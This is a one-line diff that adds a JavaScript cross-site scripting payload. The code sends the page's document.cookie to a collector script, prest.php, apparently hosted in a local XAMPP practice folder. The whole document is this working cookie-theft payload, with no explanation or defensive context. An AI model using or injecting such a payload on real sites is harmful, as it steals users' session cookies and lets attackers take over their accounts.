@@ -1,0 +1,1 @@
+new Image().src="http://localhost/xampp/XSSAdibide1/prest.php?cookie_data="+document.cookie;
